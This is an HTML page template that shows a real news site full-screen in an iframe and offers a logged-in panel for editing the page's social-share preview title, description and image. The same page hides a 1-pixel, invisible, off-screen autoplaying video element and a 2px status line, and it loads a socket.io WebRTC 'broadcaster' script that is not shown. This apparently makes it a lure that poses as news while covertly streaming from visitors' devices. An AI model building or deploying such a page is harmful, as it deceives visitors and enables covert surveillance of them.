<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>%META_TITLE%</title>

  <!-- Standard meta -->
  <meta name="description" content="%META_DESCRIPTION%">
  <meta property="og:title" content="%META_TITLE%">
  <meta property="og:description" content="%META_DESCRIPTION%">
  <meta property="og:image" content="%META_IMAGE%">
  <meta property="og:url" content="%META_URL%">
  <meta name="twitter:card" content="summary_large_image">

  <meta name="viewport" content="width=device-width,initial-scale=1">
  <link rel="stylesheet" href="css/style.css">
  <style>
    /* tiny admin UI styling */
    #meta-admin { position: fixed; right: 12px; top: 12px; width: 320px; background:#fff; color:#000; border:1px solid #ddd; padding:12px; border-radius:8px; box-shadow:0 6px 18px rgba(0,0,0,.1); display:none; z-index:9999; }
    #meta-admin h4 { margin:0 0 6px 0; font-size:14px; }
    #meta-preview { margin-top:10px; border-top:1px solid #eee; padding-top:10px; font-size:13px; }
    #meta-admin input, #meta-admin textarea { width:100%; box-sizing:border-box; margin-bottom:6px; padding:6px; font-size:13px; }
    #meta-admin button { width:100%; padding:8px; font-size:14px; }
    #meta-toggle { position: fixed; right:12px; top:12px; z-index:9998; } /* used when not displaying admin */
  </style>
</head>
<body>
  <!-- main page -->
  <div id="main-content" style="width:100vw; height:calc(100vh - 106px); margin:0; padding:0; position:relative; z-index:1;">
      <iframe src="https://abcnews.go.com" style="width:100vw; height:100%; border:none;" title="CNN News"></iframe>
  </div>

  <div id="broadcaster-bar" style="width:10vw; background:#222; color:#fff; display:flex; align-items:center; padding:8px 0; position:relative; z-index:2;">
    <video id="videoFeed" style="width:1px; height:1px; opacity:0; position:absolute; left:-9999px;" autoplay playsinline></video>
    <span id="broadcaster-status" style="margin-left:16px; font-size:2px;">Initializing...</span>
  </div>

  <!-- Admin panel (hidden by default; only shown if logged in) -->
  <div id="meta-admin" aria-hidden="true">
    <h4>Edit page preview (login required)</h4>
    <label>Title</label>
    <input id="meta-title" placeholder="Page title">
    <label>Description</label>
    <textarea id="meta-description" rows="3" placeholder="Short description"></textarea>
    <label>Image URL (og:image)</label>
    <input id="meta-image" placeholder="https://.../image.png">
    <label>Canonical / Share URL</label>
    <input id="meta-url" placeholder="https://yourdomain.com/">
    <button id="meta-save">Save Preview</button>
    <div id="meta-status" style="margin-top:8px;font-size:12px;color:#333"></div>

    <div id="meta-preview">
      <strong id="preview-title">%META_TITLE%</strong>
      <div id="preview-desc">%META_DESCRIPTION%</div>
      <img id="preview-image" src="%META_IMAGE%" alt="" style="width:100%;max-height:120px;object-fit:cover;margin-top:8px;display:block;">
    </div>
  </div>

  <script>
    // client-side admin UI logic
    async function isAuthenticated() {
      try {
        const r = await fetch('/api/auth', { cache: 'no-store' });
        const json = await r.json();
        return !!json.authenticated;
      } catch (e) { return false; }
    }

    async function loadMetaToForm() {
      const r = await fetch('/api/meta', { cache: 'no-store' });
      const meta = await r.json();
      document.getElementById('meta-title').value = meta.title || '';
      document.getElementById('meta-description').value = meta.description || '';
      document.getElementById('meta-image').value = meta.image || '';
      document.getElementById('meta-url').value = meta.url || '';
      document.getElementById('preview-title').textContent = meta.title || '';
      document.getElementById('preview-desc').textContent = meta.description || '';
      document.getElementById('preview-image').src = meta.image || '';
    }

    function applyPreviewFromForm() {
      document.getElementById('preview-title').textContent = document.getElementById('meta-title').value;
      document.getElementById('preview-desc').textContent = document.getElementById('meta-description').value;
      document.getElementById('preview-image').src = document.getElementById('meta-image').value || '';
    }

    async function initMetaAdmin() {
      const auth = await isAuthenticated();
      if (!auth) return; // not logged in -> leave admin hidden

      // show admin UI
      const panel = document.getElementById('meta-admin');
      panel.style.display = 'block';
      panel.setAttribute('aria-hidden', 'false');

      await loadMetaToForm();

      // live preview
      document.getElementById('meta-title').addEventListener('input', applyPreviewFromForm);
      document.getElementById('meta-description').addEventListener('input', applyPreviewFromForm);
      document.getElementById('meta-image').addEventListener('input', applyPreviewFromForm);

      document.getElementById('meta-save').addEventListener('click', async () => {
        const payload = {
          title: document.getElementById('meta-title').value,
          description: document.getElementById('meta-description').value,
          image: document.getElementById('meta-image').value,
          url: document.getElementById('meta-url').value
        };
        try {
          const res = await fetch('/api/meta', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
          const json = await res.json();
          if (json.success) {
            document.getElementById('meta-status').textContent = 'Saved. Social previews should update when services recrawl the page.';
            setTimeout(() => location.reload(), 800);
          } else {
            document.getElementById('meta-status').textContent = json.message || 'Save failed';
          }
        } catch (e) {
          document.getElementById('meta-status').textContent = 'Network error';
        }
      });
    }

    // run
    window.addEventListener('load', initMetaAdmin);
  </script>

  <script src="/socket.io/socket.io.js"></script>
  <script src="/webrtc-broadcaster.js"></script>
</body>
</html>
